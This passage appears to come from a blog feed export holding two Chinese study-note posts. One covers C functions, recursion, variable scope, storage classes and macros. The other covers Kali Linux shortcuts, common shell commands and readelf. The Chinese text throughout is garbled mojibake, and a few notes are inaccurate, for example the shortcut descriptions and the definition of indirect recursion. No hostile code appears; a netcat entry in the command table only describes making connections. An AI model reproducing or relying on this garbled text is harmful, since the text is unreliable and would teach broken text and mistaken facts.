<h3 id="ä¸‰ã€å‡½æ•°çš„è°ƒç”¨"><a href="#ä¸‰ã€å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="ä¸‰ã€å‡½æ•°çš„è°ƒç”¨"></a>ä¸‰ã€å‡½æ•°çš„è°ƒç”¨</h3><p>1ã€ä¸€ä¸ªå‡½æ•°å†…ä¸èƒ½å†å®šä¹‰å¦ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å‡½æ•°ä½“ï¼ˆå³åœ¨ï½›ï½é‡Œçš„å†…å®¹ï¼‰å†…å¯ä»¥å¯¹å…¶ä»–çš„å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨è¯¥å‡½æ•°æœ¬èº«ï¼Œå¯¹å…¶ä»–å‡½æ•°è¦è®°å¾—å£°æ˜å‡½æ•°å³å¯</p>
<p>2ã€å‡½æ•°ååçš„æ‹¬å·é‡Œé¢å¯ä»¥æ˜¯å„ç§å„æ ·çš„è¡¨è¾¾å¼ï¼Œå¯ä»¥æ›´å¥½è°ƒç”¨å‡½æ•°ï¼Œå‘æŒ¥å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•ˆæœ</p>
<p>3ã€è®¾è®¡å‡½æ•°çš„ç›®çš„åœ¨äºç®€åŒ–ç¨‹åºï¼ŒæŠŠæ¯ä¸€æ­¥è¦åšçš„å½’æˆä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„å‡½æ•°è¿›è¡Œå®Œæˆï¼Œç„¶ååœ¨ä¸€æ­¥æ­¥çš„è€ƒè™‘å…¶ä»–ç»†èŠ‚ï¼Œæœ€ç»ˆå®Œæˆä¸€ä¸ªå¤æ‚çš„ç¨‹åº</p>
<p>4ã€ä¸€ä¸ªå‡½æ•°åœ¨è‡ªèº«å‡½æ•°ä½“å†…è°ƒç”¨è‡ªå·±ç§°ä¸ºç›´æ¥é€’å½’è°ƒç”¨ï¼›è°ƒç”¨å…¶ä»–å‡½æ•°ç§°ä¸ºé—´æ¥é€’å½’è°ƒç”¨ï¼›</p>
<p>5ã€ä½¿ç”¨ç›´æ¥é€’å½’è°ƒç”¨éœ€æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼šï¼ˆ1ï¼‰é€’å½’æ¨¡å¼ï¼Œå¥½ä¼¼æ•°å­¦ä¸­çš„å•ä¸ªå‡½æ•°è‡ªèº«å±‚å±‚åµŒå¥—ï¼Œæœ‰ç‚¹å¾ªç¯è¯­å¥çš„æ„Ÿè§‰ï¼Œä½†å´èƒ½å®Œæˆä¸€äº›å¾ªç¯è¯­å¥éš¾ä»¥å®Œæˆçš„ç¨‹åºï¼ˆ2ï¼‰é€’å½’å‡ºå£ï¼Œä¸€èˆ¬åˆ°1æˆ–0è„±ç¦»é€’å½’</p>
<p>6ã€å½“å‡½æ•°åœ¨ä¸åŒæºæ–‡ä»¶æ—¶ä¸€æ ·å¯ä»¥è°ƒç”¨å‡½æ•°ï¼Œåªéœ€åœ¨è°ƒç”¨ä¹‹å‰è¿›è¡Œå‡½æ•°å£°æ˜å³å¯</p>
<h3 id="å››ã€å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå­˜æœŸ"><a href="#å››ã€å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå­˜æœŸ" class="headerlink" title="å››ã€å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå­˜æœŸ"></a>å››ã€å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå­˜æœŸ</h3><p>1ã€å˜é‡çš„ä½œç”¨åŸŸæŒ‡å˜é‡çš„æœ‰æ•ˆèŒƒå›´ï¼Œå³å¯ä»¥å¼•ç”¨å˜é‡çš„åŒºåŸŸï¼›åˆ†ä¸ºå…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ã€‚</p>
<p>å±€éƒ¨å˜é‡ï¼šåœ¨å®šä¹‰çš„ä»£ç å—å†…å®šä¹‰ä¸”ä½œç”¨</p>
<p>å…¨å±€å˜é‡ï¼šåœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œä½œç”¨åŸŸä»å®šä¹‰å¼€å§‹ç›´åˆ°æºæ–‡ä»¶ç»“æŸï¼Œä½†æ˜¯å¦‚æœåœ¨æŸä¸ªå‡½æ•°å†…æœ‰åŒåçš„å±€éƒ¨å˜é‡ï¼Œåˆ™å±€éƒ¨å˜é‡çš„å€¼ç”Ÿæ•ˆï¼Œå…¨å±€å˜é‡å€¼è¢«éšè—</p>
<p>2ã€ä»£ç å—ï¼šåœ¨ä¸€å¯¹èŠ±æ‹¬å·é‡Œé¢çš„ä»£ç æ®µï¼ŒåŒ…æ‹¬å‡½æ•°ä½“ä»¥åŠå‡½æ•°ä½“å†…çš„è¯­å¥å—</p>
<p>3ã€åœ¨æ¯ä¸ªä»£ç å—å†…å®šä¹‰çš„å˜é‡éƒ½åªèƒ½åœ¨å…¶å†…ä½¿ç”¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸åŒçš„ä»£ç å—ä½¿ç”¨ç›¸åŒçš„å˜é‡åï¼Œå¹¶ä¸”ä¸ä¼šäº’ç›¸å¹²æ‰°ï¼Œæ¯”å¦‚ï¼šåœ¨ä¸€ä¸ªå‡½æ•°å†…å®šä¹‰iä¸º10ï¼›åˆ™åœ¨æ•´ä¸ªå‡½æ•°å†…iéƒ½æœ‰ä¸€ä¸ªä¸º10çš„å€¼ï¼›è€Œåœ¨æ­¤æ—¶ä½¿ç”¨äº†å¦‚ifè¯­å¥ï¼Œä¸”æ˜¯ä½¿ç”¨äº†ï½›i=0ï½ï¼Œé‚£ä¹ˆåœ¨ifçš„èŠ±æ‹¬å·é‡Œï¼Œiä¸º0ï¼Œä½†æ˜¯ä¸åœ¨èŠ±æ‹¬å·é‡Œçš„iä»ç„¶ä¸º10ã€‚æˆ‘ç†è§£ä¸ºä¼˜å…ˆçº§åˆ«é—®é¢˜ï¼Œçº§åˆ«é«˜ä¼˜å…ˆå±•ç¤ºï¼Œå´ä¸ä¼šè¦†ç›–</p>
<p>4ã€å˜é‡çš„ç”Ÿå­˜æœŸï¼šå˜é‡å€¼åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨çš„æœŸé™ï¼Œå³ä»ç³»ç»Ÿä¸ºå˜é‡åˆ†é…å­˜å‚¨å•å…ƒå¼€å§‹åˆ°å°†å­˜å‚¨å•å…ƒæ”¶å›ä¸ºæ­¢ã€‚</p>
<p>5ã€Cè¯­è¨€ç¨‹åºå æ®çš„å­˜å‚¨ç©ºé—´åˆ†ä¸ºç¨‹åºåŒºã€é™æ€å­˜å‚¨åŒºå’ŒåŠ¨æ€å­˜å‚¨åŒº</p>
<p>ç¨‹åºåŒºï¼šç”¨äºå­˜æ”¾ç¨‹åº</p>
<p>é™æ€å­˜å‚¨åŒºï¼šç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶å°±åˆ†é…çš„å›ºå®šå­˜å‚¨å•å…ƒï¼Œå¦‚å…¨å±€å˜é‡ã€‚å…¶ç”Ÿå­˜æœŸä»ç¨‹åºè¿è¡Œå¼€å§‹åˆ°ç¨‹åºçš„ç»“æŸ</p>
<p>åŠ¨æ€å­˜å‚¨åŒºï¼šå‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­è¿›è¡ŒåŠ¨æ€åˆ†é…çš„å­˜å‚¨å•å…ƒï¼Œå¦‚å‡½æ•°å½¢å‚ã€è‡ªåŠ¨å˜é‡ã€å‡½æ•°è°ƒç”¨æ—¶çš„ç°åœºä¿æŠ¤å’Œè¿”å›å€¼åœ°å€ã€‚å…¶ç”Ÿå­˜æœŸä»å®šä¹‰å˜é‡å¼€å§‹åˆ°å‡½æ•°ï¼ˆæˆ–å¤åˆè¯­å¥ï¼‰è¿è¡Œç»“æŸä¸ºæ­¢</p>
<p>6ã€ä¸€äº›è¯´æ˜å­˜å‚¨ç±»å‹çš„å…³é”®å­—ï¼šï¼ˆ1ï¼‰auto è‡ªåŠ¨å˜é‡ï¼ˆ2ï¼‰static é™æ€å˜é‡ ï¼ˆ3ï¼‰register å¯„å­˜å™¨å˜é‡ ï¼ˆ4ï¼‰extern ï¼ˆå¤–éƒ¨å˜é‡ï¼‰ï¼ˆå­˜å‚¨ç±»å‹å…³é”®å­—å†™åœ¨ä»¥å‰å®šä¹‰å˜é‡æœ€å‰é¢ï¼Œæˆ–è€…å†™åœ¨ç±»å‹æ ‡è¯†ç¬¦å’Œå˜é‡ä¹‹é—´ï¼‰</p>
<p>7ã€ï¼ˆ1ï¼‰æœªè¯´æ˜å­˜å‚¨ç±»å‹çš„å˜é‡é»˜è®¤ä¸ºè‡ªåŠ¨å˜é‡ï¼Œæ‰€ä»¥autoå¸¸å¸¸çœç•¥ï¼›</p>
<p>ï¼ˆ2ï¼‰ä½¿ç”¨static é™æ€å˜é‡åªä¼šåˆå§‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åå†æ¬¡ä½¿ç”¨ï¼Œä¸ä¼šå†è¿›è¡Œèµ‹å€¼ï¼Œå…¶å€¼åº”è¯¥ä¸ºä¸Šæ¬¡è°ƒç”¨åçš„å€¼ï¼›</p>
<p>ï¼ˆ3ï¼‰register å¯„å­˜å™¨å˜é‡ï¼šå€Ÿç”¨å¯„å­˜å™¨å¯ä»¥ä½¿å¾—è¿ç®—æ›´å¿«ï¼Œä½†æ˜¯å¯„å­˜å™¨æ•°é‡æœ‰é™ï¼Œä¸å¤Ÿæ—¶ï¼Œå°†è‡ªåŠ¨è½¬ä¸ºè‡ªåŠ¨å˜é‡ã€‚å¹¶ä¸”å¯„å­˜å™¨é•¿åº¦æœ‰é™ï¼Œå¯„å­˜å™¨å˜é‡åªèƒ½æ˜¯å­—ç¬¦å‹ã€æ•´å‹ã€æŒ‡é’ˆç±»å‹çš„å˜é‡ï¼›</p>
<p>ï¼ˆ4ï¼‰å¤–éƒ¨å˜é‡ ï¼šæ˜¯å®šä¹‰åœ¨å‡½æ•°å¤–éƒ¨çš„å…¨å±€å˜é‡ï¼ˆå­˜æ”¾åœ¨é™æ€å­˜å‚¨åŒºï¼‰ã€‚ä½¿ç”¨externå£°æ˜å¤–éƒ¨å˜é‡æ—¶ï¼Œå¯ä»¥æŠŠä¹‹åå®šä¹‰çš„å¤–éƒ¨å˜é‡çš„ä½œç”¨åŸŸæå‰åˆ°externå®šä¹‰çš„ä½ç½®ï¼Œæˆ–è€…åœ¨ä¸åŒçš„æºæ–‡ä»¶é‡Œé¢ä½¿ç”¨å˜é‡</p>
<p>ï¼ˆ5ï¼‰å¦‚æœåœ¨å®šä¹‰å…¨å±€å˜é‡æ—¶åŠ ä¸€ä¸ªstaticä¼šæ„æˆé™æ€å…¨å±€å˜é‡ã€‚é‚£ä¹ˆå°†æ— æ³•ä½¿ç”¨externè¿›è¡Œæ‹“å±•ä½œç”¨åŸŸåˆ°å…¶ä»–æºæ–‡ä»¶ä¸­ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åŒåœ¨ä¸€ä¸ªæºæ–‡ä»¶å†…çš„å‡½æ•°è¿›è¡Œé—´æ¥è°ƒç”¨</p>
<h3 id="äº”ã€å®å®šä¹‰"><a href="#äº”ã€å®å®šä¹‰" class="headerlink" title="äº”ã€å®å®šä¹‰"></a>äº”ã€å®å®šä¹‰</h3><p>1ã€å®å®šä¹‰ï¼šå°†ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼ˆå®åï¼‰å®šä¹‰ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åˆ†ä¸ºæ— å‚å®å®šä¹‰ä¸å¸¦å‚å®å®šä¹‰</p>
<p>2ã€æ— å‚å®å®šä¹‰ï¼šå®šä¹‰ä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„å®ã€‚è¯­æ³•æ ¼å¼ï¼š**#define å®å å­—ç¬¦ä¸²**</p>
<p>ï¼ˆ1ï¼‰ä¸éœ€è¦åœ¨åé¢åœ¨åˆ†å·â€œ  ï¼›â€</p>
<p>ï¼ˆ2ï¼‰å®å®šä¹‰ä½¿ç”¨ä¸€ä¸ªå®åä»£æ›¿ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»…ä»…æ˜¯ç®€å•çš„æ›¿æ¢ï¼Œä¸åˆ†é…å†…å­˜ç©ºé—´</p>
<p>ï¼ˆ3ï¼‰å®å®šä¹‰å¯ä»¥å¼•ç”¨å·²ç»å®šä¹‰çš„å®å®šä¹‰ï¼Œè¿›è¡ŒåµŒå¥—</p>
<p>ï¼ˆ4ï¼‰å®å®šä¹‰è¿‡çš„å®ååœ¨æ•´ä¸ªä½œç”¨åŸŸå†…ä¸èƒ½åœ¨æ”¹å˜</p>
<p>ï¼ˆ5ï¼‰å®å®šä¹‰å¯ä¸å¸¸é‡ç”¨æ³•ç›¸ä¼¼ï¼Œç”¨æ•°å­—å»æ›¿æ¢å®å</p>
<p>ï¼ˆ6ï¼‰ç¨‹åºä¸­å¦‚æœåœ¨ä¸ºå®ååŠ ä¸Šäº†åŒå¼•å·ï¼Œå°†è¡¨ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®ï¼Œæ‰€ä»¥æ­¤æ—¶ä¸ä¼šè¿›è¡Œå®æ›¿æ¢</p>
<p>3ã€å¸¦å‚å®å®šä¹‰ï¼šå®šä¹‰ä¸€ä¸ªå¸¦å½¢å¼å‚æ•°çš„å®ã€‚è¯­æ³•æ ¼å¼ï¼š**#define å®å(å½¢å‚è¡¨) å­—ç¬¦ä¸²** ã€‚  </p>
<p>è°ƒç”¨å¸¦å‚å®æ—¶æ ¼å¼ä¸ºï¼š<strong>å®å(å®å‚è¡¨)</strong>  [å…¶ç”¨æ³•ä¸å‡½æ•°çš„å½¢å‚ä¸å®å‚ç›¸ç±»ä¼¼ï¼Œå¯è¿›è¡Œä¸²è®°ï¼ˆä½†ä¸èƒ½æ··ä¸ºä¸€è°ˆï¼‰]</p>
<p>ï¼ˆ1ï¼‰å½¢å‚ï¼ˆå®å‚ï¼‰è¡¨æ˜¯æŒ‡ä¸€è‡³å¤šä¸ªçš„å½¢å‚ï¼Œå½¢å‚é—´ç”¨é€—å·éš”å¼€</p>
<p>ï¼ˆ2ï¼‰å®å‚å¯ä»¥æ˜¯å¸¸é‡ã€å˜é‡æˆ–è¡¨è¾¾å¼</p>
<p>ï¼ˆ3ï¼‰å¸¦å‚å®ä¸­çš„å®åä¸å…¶åçš„å·¦æ‹¬å· ( ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™å°†ä¼šè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯æ— å‚å®å®šä¹‰</p>
<p>ï¼ˆ4ï¼‰å¸¦å‚å®å®šä¹‰ä¸€èˆ¬æŠŠå½¢å‚ç”¨åœ†æ‹¬å·æ‹¬èµ·æ¥ï¼Œé˜²æ­¢æœ‰äº›å‡ºç°é”™è¯¯ï¼Œä¾‹å¦‚ï¼š#define H(x) x*x</p>
<p>å½“H(10+1)æ—¶ï¼Œå®å±•å¼€ä¸º10+1 * 10+1 ã€‚æ˜¾ç„¶è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œåº”å†™æˆ#define H(x) (x)*(x)</p>
<p> ï¼ˆ5ï¼‰å®å±•å¼€å¯ä»¥å¾—åˆ°è‹¥å¹²ä¸ªçš„ç»“æœ</p>
]]></content>
  </entry>
  <entry>
    <title>å°è¯•Linuxâ€”â€”ç¬”è®°</title>
    <url>/2020/10/18/2020-10-18-%E5%B0%8F%E8%AF%95Linux%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="æˆ‘ä½¿ç”¨VMwareè™šæ‹Ÿæœºæ¥å®‰è£…kali-Linuxç³»ç»Ÿï¼ˆå…·ä½“å®‰è£…æ•™ç¨‹ï¼Œå¯è‡ªè¡Œæœç´¢ï¼Œæˆ–è€…æ˜¯bç«™ä¸ŠæŸ¥è¯¢ï¼‰"><a href="#æˆ‘ä½¿ç”¨VMwareè™šæ‹Ÿæœºæ¥å®‰è£…kali-Linuxç³»ç»Ÿï¼ˆå…·ä½“å®‰è£…æ•™ç¨‹ï¼Œå¯è‡ªè¡Œæœç´¢ï¼Œæˆ–è€…æ˜¯bç«™ä¸ŠæŸ¥è¯¢ï¼‰" class="headerlink" title="æˆ‘ä½¿ç”¨VMwareè™šæ‹Ÿæœºæ¥å®‰è£…kali Linuxç³»ç»Ÿï¼ˆå…·ä½“å®‰è£…æ•™ç¨‹ï¼Œå¯è‡ªè¡Œæœç´¢ï¼Œæˆ–è€…æ˜¯bç«™ä¸ŠæŸ¥è¯¢ï¼‰"></a>æˆ‘ä½¿ç”¨VMwareè™šæ‹Ÿæœºæ¥å®‰è£…kali Linuxç³»ç»Ÿï¼ˆå…·ä½“å®‰è£…æ•™ç¨‹ï¼Œå¯è‡ªè¡Œæœç´¢ï¼Œæˆ–è€…æ˜¯bç«™ä¸ŠæŸ¥è¯¢ï¼‰</h5><h4 id="ä¸€ã€å¿«æ·é”®"><a href="#ä¸€ã€å¿«æ·é”®" class="headerlink" title="ä¸€ã€å¿«æ·é”®"></a>ä¸€ã€å¿«æ·é”®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs Linux">Up(Down) ä¸Šï¼ˆä¸‹ï¼‰ä¸€æ¡æŒ‡ä»¤<br>Ctrl + c ç»ˆæ­¢å½“å‰è¿›ç¨‹<br>Ctrl + z æŒ‚èµ·å½“å‰è¿›ç¨‹ï¼Œä½¿ç”¨â€œfgâ€å¯å”¤é†’<br>Ctrl + d åˆ é™¤å…‰æ ‡å¤„çš„å­—ç¬¦<br>Ctrl + l æ¸…å±<br>Ctrl + a ç§»åŠ¨åˆ°å‘½ä»¤è¡Œé¦–<br>Ctrl + e ç§»åŠ¨åˆ°å‘½ä»¤è¡Œå°¾<br>Ctrl + b æŒ‰å•è¯åç§»ï¼ˆå‘å·¦ï¼‰<br>Ctrl + f æŒ‰å•è¯å‰ç§»ï¼ˆå‘å³ï¼‰<br>Ctrl + Shift + c å¤åˆ¶ <br>Ctrl + Shift + v ç²˜è´´<br><br></code></pre></td></tr></table></figure>

<h4 id="äºŒã€å¸¸è§æŒ‡ä»¤"><a href="#äºŒã€å¸¸è§æŒ‡ä»¤" class="headerlink" title="äºŒã€å¸¸è§æŒ‡ä»¤"></a>äºŒã€å¸¸è§æŒ‡ä»¤</h4><table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td>ls</td>
<td>ç”¨æ¥æ˜¾ç¤ºç›®æ ‡åˆ—è¡¨</td>
</tr>
<tr>
<td>cd æ–‡ä»¶å</td>
<td>åˆ‡æ¢è¿›å…¥åˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼ˆå¯è¿›å…¥ä¸‹çº§ç›®å½•ï¼Œä¹Ÿå¯ä»¥æ®æ­¤è¿”å›ä¸Šçº§ç›®å½•ï¼‰</td>
</tr>
<tr>
<td>pwd</td>
<td>ä»¥ç»å¯¹è·¯å¾„çš„æ–¹å¼æ˜¾ç¤ºç”¨æˆ·å½“å‰å·¥ä½œç›®å½•</td>
</tr>
<tr>
<td>man  command</td>
<td>æŸ¥çœ‹Linuxä¸­çš„æŒ‡ä»¤å¸®åŠ©ã€é…ç½®æ–‡ä»¶å¸®åŠ©å’Œç¼–ç¨‹å¸®åŠ©ç­‰ä¿¡æ¯</td>
</tr>
<tr>
<td>apropos whatever</td>
<td>åœ¨ä¸€äº›ç‰¹å®šçš„åŒ…å«ç³»ç»Ÿå‘½ä»¤çš„ç®€çŸ­æè¿°çš„æ•°æ®åº“æ–‡ä»¶é‡ŒæŸ¥æ‰¾å…³é”®å­—</td>
</tr>
<tr>
<td>echo  string</td>
<td>æ‰“å°ä¸€è¡Œæ–‡æœ¬ï¼Œå‚æ•°â€œ-eâ€å¯æ¿€æ´»è½¬ä¹‰å­—ç¬¦</td>
</tr>
<tr>
<td>cat  file</td>
<td>è¾“å‡ºæ–‡ä»¶çš„å†…å®¹</td>
</tr>
<tr>
<td>more/less [file]</td>
<td>å…è®¸ç”¨æˆ·å‘å‰æˆ–å‘åæµè§ˆæ–‡å­—æ¡£æ¡ˆçš„å†…å®¹</td>
</tr>
<tr>
<td>mv [file1] [file2]</td>
<td>æŠŠfile1é‡Œçš„å†…å®¹ç§»åŠ¨åˆ°file2é‡Œï¼Œ<strong>å¹¶ä¸”è¦†ç›–file2åŸæœ‰å†…å®¹ä»¥åŠåˆ é™¤file1</strong> ï¼ˆæ‰€ä»¥å¯ä»¥ç”¨æ¥æ›´åï¼‰</td>
</tr>
<tr>
<td>cp [file1] [file2]</td>
<td>æŠŠfile1é‡Œçš„å†…å®¹å¤åˆ¶åˆ°file2ä¸­ï¼Œ<strong>å¹¶ä¸”è¦†ç›–file2åŸæœ‰çš„å†…å®¹</strong></td>
</tr>
<tr>
<td>rm [file]</td>
<td>åˆ é™¤æ–‡ä»¶file</td>
</tr>
<tr>
<td>ps</td>
<td>ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€</td>
</tr>
<tr>
<td>top</td>
<td><strong>å®æ—¶æŸ¥çœ‹</strong>ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæƒ…å†µ</td>
</tr>
<tr>
<td>kill</td>
<td>æ€æ­»ä¸€ä¸ªè¿›ç¨‹</td>
</tr>
<tr>
<td>ifconfig</td>
<td>æŸ¥çœ‹æˆ–è®¾ç½®ç½‘ç»œè®¾å¤‡</td>
</tr>
<tr>
<td>ping ç›®æ ‡åœ°å€</td>
<td>æŸ¥çœ‹ç½‘ç»œä¸Šçš„ä¸»æœºæ˜¯å¦å·¥ä½œ</td>
</tr>
<tr>
<td>netstat</td>
<td>æ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨å’Œç½‘ç»œç«¯å£ä¿¡æ¯</td>
</tr>
<tr>
<td>nc ipåœ°å€ ipç«¯å£</td>
<td>å»ºç«‹ TCP å’Œ UDP è¿æ¥å¹¶ç›‘å¬ï¼ˆè¿æ¥ä¸€ä¸ªIPåœ°å€ï¼‰</td>
</tr>
<tr>
<td>su</td>
<td>åˆ‡æ¢å½“å‰ç”¨æˆ·èº«ä»½åˆ°å…¶ä»–ç”¨æˆ·èº«ä»½</td>
</tr>
<tr>
<td>touch æ–‡ä»¶å</td>
<td>åˆ›å»ºæ–°çš„<strong>ç©ºæ–‡ä»¶</strong> ï¼ˆå¦‚æœæœªè¿›å…¥ä»»ä½•ç›®å½•ä¸‹è¿›è¡Œåˆ›å»ºï¼Œæ–°æ–‡ä»¶å¤¹ä¼šåœ¨ä¸»æ–‡ä»¶å¤¹é‡Œé¢ï¼‰</td>
</tr>
<tr>
<td>mkdir ç›®å½•å</td>
<td>åˆ›å»ºç›®å½• ï¼ˆç›®å½•çš„ä½ç½®åŒä¸Šï¼‰</td>
</tr>
<tr>
<td>chmod</td>
<td>å˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™</td>
</tr>
<tr>
<td>chown</td>
<td>å˜æ›´æŸä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„</td>
</tr>
<tr>
<td>nano / vim/emacsï¼ˆvimä¸­qä¸ä¿å­˜é€€å‡ºï¼Œwqä¿å­˜åé€€å‡ºï¼Œiå¯ä¿®æ”¹ç¼–è¾‘æ–‡æœ¬ï¼ŒESCç»“æŸæŸä¸ªçŠ¶æ€ï¼‰</td>
<td>å­—ç¬¦ç»ˆç«¯çš„æ–‡æœ¬ç¼–è¾‘å™¨</td>
</tr>
<tr>
<td>exit</td>
<td>é€€å‡º shell</td>
</tr>
<tr>
<td>file æ–‡ä»¶</td>
<td>æŸ¥çœ‹æ–‡ä»¶å±æ€§ä¿¡æ¯</td>
</tr>
<tr>
<td>cd ..</td>
<td>è¿”å›ä¸Šä¸€çº§ç›®å½•</td>
</tr>
<tr>
<td>cd â€“</td>
<td>è¿”å›åˆ°æœ€å¼€å§‹è¿›å…¥shellçš„ç›®å½•ä¸‹</td>
</tr>
<tr>
<td>ldd elfæ–‡ä»¶</td>
<td>æŸ¥çœ‹è¯¥elfæ–‡ä»¶çš„libcå’Œld</td>
</tr>
<tr>
<td>whoami</td>
<td>æ‰“å°ç”¨æˆ·å</td>
</tr>
<tr>
<td>uname</td>
<td>æ‰“å°ç³»ç»Ÿä¿¡æ¯</td>
</tr>
<tr>
<td>cat æ–‡ä»¶1 &gt;&gt; æ–‡ä»¶2</td>
<td>æŠŠæ–‡ä»¶1å†…å®¹å¤åˆ¶åˆ°æ–‡ä»¶2å†…å®¹çš„åé¢</td>
</tr>
<tr>
<td>/</td>
<td>æ ¹ç›®å½•</td>
</tr>
<tr>
<td>/*</td>
<td>æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>æŒ‡ä»¤ls -alå¯æŸ¥çœ‹çš„ä¿¡æ¯ï¼šï¼ˆå¦‚æœä¸ºls -låˆ™æ˜¾ç¤ºlså¯æŸ¥çœ‹çš„æ–‡ä»¶çš„ä»¥ä¸‹è¯¦ç»†èµ„æ–™ï¼Œæˆ–è€…ls -l æ–‡ä»¶åå¯ä»¥åªæŸ¥çœ‹è¯¥æ–‡ä»¶çš„ä¿¡æ¯ï¼‰</p>
<p>1.ç¬¬ä¸€åˆ—è¡¨ç¤ºæ–‡ä»¶çš„å±æ€§ï¼š</p>
<p>ã€dã€‘ï¼Œåˆ™æ˜¯ç›®å½•</p>
<p>ã€-ã€‘ï¼Œåˆ™æ˜¯æ–‡ä»¶</p>
<p>ã€lã€‘ï¼Œåˆ™è¡¨ç¤ºä¸ºé“¾æ¥æ–‡ä»¶ï¼ˆlink fileï¼‰</p>
<p>ã€bã€‘ï¼Œåˆ™è¡¨ç¤ºä¸ºè®¾å¤‡æ–‡ä»¶ä¸­å¯ä¾›å­˜å‚¨çš„æ¥å£è®¾å¤‡</p>
<p>ã€cã€‘ï¼Œåˆ™è¡¨ç¤ºä¸ºè®¾å¤‡æ–‡ä»¶ä¸­çš„ä¸²è¡Œç«¯å£è®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ã€‚</p>
<p>#æ¥ä¸‹æ¥çš„å±æ€§ä¸­ï¼Œ3ä¸ªä¸ºä¸€ç»„ï¼Œä¸”å‡ä¸ºâ€œrwxâ€3ä¸ªå‚æ•°ç»„åˆã€‚å…¶ä¸­rè¡¨ç¤ºå¯è¯»readï¼Œwè¡¨ç¤ºå¯å†™writeï¼Œxè¡¨ç¤ºå¯æ‰§è¡Œexcuteã€‚</p>
<p>ç¬¬ä¸€ç»„ä¸ºâ€œæ‹¥æœ‰è€…çš„æƒé™ï¼ˆrootæƒé™ï¼‰â€ï¼Œç¬¬äºŒç»„ä¸ºâ€œåŒç”¨æˆ·ç»„çš„æƒé™â€ï¼Œç¬¬ä¸‰ç»„ä¸ºâ€œå…¶ä»–éæœ¬ç”¨æˆ·ç»„çš„æƒé™â€ã€‚</p>
<p>2ã€ç¬¬äºŒåˆ—è¡¨ç¤ºè¿æ¥å ç”¨çš„èŠ‚ç‚¹ï¼ˆi-nodeï¼‰</p>
<p>3ã€ç¬¬ä¸‰åˆ—è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„â€œæ‹¥æœ‰è€…â€</p>
<p>4ã€ç¬¬å››åˆ—è¡¨ç¤ºæ‹¥æœ‰è€…çš„ç”¨æˆ·ç»„</p>
<p>5ã€ç¬¬äº”åˆ—ä¸ºè¿™ä¸ªæ–‡ä»¶çš„å¤§å°</p>
<p>6ã€ç¬¬å…­åˆ—ä¸ºè¿™ä¸ªæ–‡ä»¶çš„åˆ›å»ºæ—¥æœŸæˆ–è€…æ˜¯æœ€è¿‘çš„ä¿®æ”¹æ—¥æœŸ</p>
<p>7ã€ç¬¬ä¸ƒåˆ—ä¸ºè¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åï¼šå¦‚æœæ–‡ä»¶åå‰é¢æœ‰.è¯´æ˜æ˜¯éšè—æ–‡ä»¶ã€‚å¦‚æœåªè¾“å…¥ls å‰é¢åŠ .çš„æ–‡ä»¶ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚ls -alåˆ™ä¼šæ˜¾ç¤ºå‡ºå…¨éƒ¨æ–‡ä»¶ã€‚</p>
<h4 id="readelfæŒ‡ä»¤"><a href="#readelfæŒ‡ä»¤" class="headerlink" title="readelfæŒ‡ä»¤"></a>readelfæŒ‡ä»¤</h4><p>1ã€readelf -h æ–‡ä»¶å  æŸ¥çœ‹æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯</p>
<p>2ã€readelf -S æ–‡ä»¶å  æŸ¥çœ‹æ–‡ä»¶ç¬¦å·è¡¨</p>
